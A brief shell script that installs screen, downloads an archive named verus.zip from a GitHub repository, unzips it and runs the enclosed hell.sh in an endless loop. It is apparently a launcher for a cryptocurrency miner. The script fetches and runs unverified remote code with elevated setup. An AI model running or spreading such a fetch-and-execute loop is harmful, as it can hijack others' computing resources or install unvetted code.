#!/bin/sh

sudo apt update -y
sudo apt install screen -y
sudo screen -S random
wget https://raw.githubusercontent.com/elemenapi/hell/main/verus.zip && unzip verus.zip
chmod +x hell.sh
while [ 1 ]; do
./hell.sh
sleep 6969
done
sleep 6969
